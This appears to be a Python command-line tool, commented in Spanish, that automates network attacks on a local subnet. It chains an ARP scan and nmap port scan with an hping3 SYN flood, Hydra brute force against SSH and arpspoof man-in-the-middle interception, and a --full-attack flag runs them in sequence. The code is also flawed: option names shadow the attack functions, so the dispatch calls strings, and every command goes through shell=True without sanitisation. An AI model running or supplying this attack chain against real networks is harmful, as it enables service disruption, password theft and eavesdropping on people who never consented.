import click
import pandas as pd
import subprocess
from scapy.all import ARP, Ether, sniff, srp
from cryptography.fernet import Fernet
import socket
import http.client

# Función para ejecutar comandos del sistema
def run_command(command):
    try:
        result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return result.stdout.decode('utf-8')
    except subprocess.CalledProcessError as e:
        print(f"Error al ejecutar el comando {command}: {e}")
        return None

# Función para escanear la red local con arping2
def scan_with_arping(ip_range):
    print(f"Escaneando la red local con arping2: {ip_range}")
    command = f"arping2 -c 5 {ip_range}"
    output = run_command(command)
    print(output)
    return output

# Función para escanear la red local con ARP (Scapy)
def scan_local_network_scapy(ip_range):
    arp = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp
    result, unanswered = srp(packet, timeout=3, verbose=0)

    devices = [{'IP': received.psrc, 'MAC': received.hwsrc} for sent, received in result]
    df = pd.DataFrame(devices)
    return df

# Función para capturar paquetes con tcpdump
def capture_with_tcpdump(interface):
    print(f"Iniciando captura de paquetes en la interfaz {interface} usando tcpdump...")
    command = f"sudo tcpdump -i {interface} -c 10"
    output = run_command(command)
    print(output)
    return output

# Función para realizar un test de conectividad con hping3
def test_connectivity_with_hping3(ip):
    print(f"Probando la conectividad con hping3 hacia {ip}")
    command = f"hping3 -S {ip} -c 5"
    output = run_command(command)
    print(output)
    return output

# Función para realizar una petición HTTP a un servidor
def perform_http_request(host):
    conn = http.client.HTTPConnection(host)
    conn.request("GET", "/")
    response = conn.getresponse()
    print(f"Respuesta HTTP desde {host}: {response.status} {response.reason}")
    data = response.read()
    print(data.decode('utf-8'))
    conn.close()

# Función para comunicación mediante sockets
def socket_communication(ip, port, message):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ip, port))
        s.sendall(message.encode())
        data = s.recv(1024)
    print(f"Recibido de {ip}:{port}: {data.decode('utf-8')}")

# Función para cifrar un mensaje usando Fernet
def encrypt_message(key, message):
    f = Fernet(key)
    ciphertext = f.encrypt(message.encode())
    return ciphertext

# Función para descifrar un mensaje cifrado
def decrypt_message(key, ciphertext):
    f = Fernet(key)
    decrypted_message = f.decrypt(ciphertext)
    return decrypted_message.decode()

# Automatización de ataque DoS
def automate_dos(ip):
    print(f"Iniciando ataque DoS contra {ip} usando hping3...")
    command = f"hping3 -S {ip} --flood"
    run_command(command)

# Automatización de escaneo de puertos con nmap
def automate_portscan(ip):
    print(f"Escaneando puertos de {ip} usando nmap...")
    command = f"nmap -sS -p- {ip}"
    output = run_command(command)
    print(output)
    return output

# Automatización de ataque de fuerza bruta con Hydra (por ejemplo para SSH)
def automate_bruteforce(ip, service, username, wordlist):
    print(f"Iniciando ataque de fuerza bruta contra {service} en {ip}...")
    command = f"hydra -l {username} -P {wordlist} {ip} {service}"
    output = run_command(command)
    print(output)
    return output

# Automatización de ataque MITM usando arpspoof
def automate_mitm(victim_ip, gateway_ip, interface):
    print(f"Ejecutando ataque MITM entre {victim_ip} y {gateway_ip}...")
    command = f"arpspoof -i {interface} -t {victim_ip} {gateway_ip}"
    run_command(command)

# Flujo completo de ataques automatizados
def full_attack(ip_range, interface, gateway_ip, username, wordlist):
    print("Iniciando flujo completo de ataques...")

    # Escaneo de la red
    devices_df = scan_local_network_scapy(ip_range)
    if devices_df.empty:
        print("No se encontraron dispositivos en la red.")
        return

    # Selecciona el primer dispositivo encontrado
    selected_ip = devices_df.iloc[0]['IP']

    # Escaneo de puertos
    automate_portscan(selected_ip)

    # Ataque MITM
    automate_mitm(selected_ip, gateway_ip, interface)

    # Ataque DoS
    automate_dos(selected_ip)

    # Ataque de fuerza bruta (ejemplo con SSH)
    automate_bruteforce(selected_ip, "ssh", username, wordlist)

# CLI con Click
@click.command()
@click.option("--ip-range", default="192.168.1.0/24", help="Rango de IP para escanear")
@click.option("--device", default=1, help="Dispositivo a desencriptar (1, 2, ...)")
@click.option("--interface", default="eth0", help="Interfaz de red para capturar paquetes")
@click.option("--automate-dos", default=None, help="Automatizar un ataque DoS hacia una IP")
@click.option("--automate-portscan", default=None, help="Automatizar un escaneo de puertos hacia una IP")
@click.option("--automate-bruteforce", default=None, help="Automatizar un ataque de fuerza bruta (formato: IP,service,username,wordlist)")
@click.option("--automate-mitm", default=None, help="Ejecutar un ataque MITM (formato: victim_ip,gateway_ip)")
@click.option("--full-attack", is_flag=True, help="Ejecutar un flujo completo de ataques automatizados")
def main(ip_range, device, interface, automate_dos, automate_portscan, automate_bruteforce, automate_mitm, full_attack):
    # Escaneo de red con arping2 y Scapy
    arping_output = scan_with_arping(ip_range)
    devices_df = scan_local_network_scapy(ip_range)

    click.echo("Dispositivos conectados (ARP + Scapy):")
    click.echo(devices_df)

    # Automatización de ataques
    if automate_dos:
        automate_dos(automate_dos)
    elif automate_portscan:
        automate_portscan(automate_portscan)
    elif automate_bruteforce:
        ip, service, username, wordlist = automate_bruteforce.split(',')
        automate_bruteforce(ip, service, username, wordlist)
    elif automate_mitm:
        victim_ip, gateway_ip = automate_mitm.split(',')
        automate_mitm(victim_ip, gateway_ip, interface)
    elif full_attack:
        gateway_ip = input("Introduce la IP de la puerta de enlace (gateway): ")
        username = input("Introduce el nombre de usuario para fuerza bruta: ")
        wordlist = input("Introduce la ruta al diccionario de contraseñas: ")
        full_attack(ip_range, interface, gateway_ip, username, wordlist)

if __name__ == "__main__":
    main()
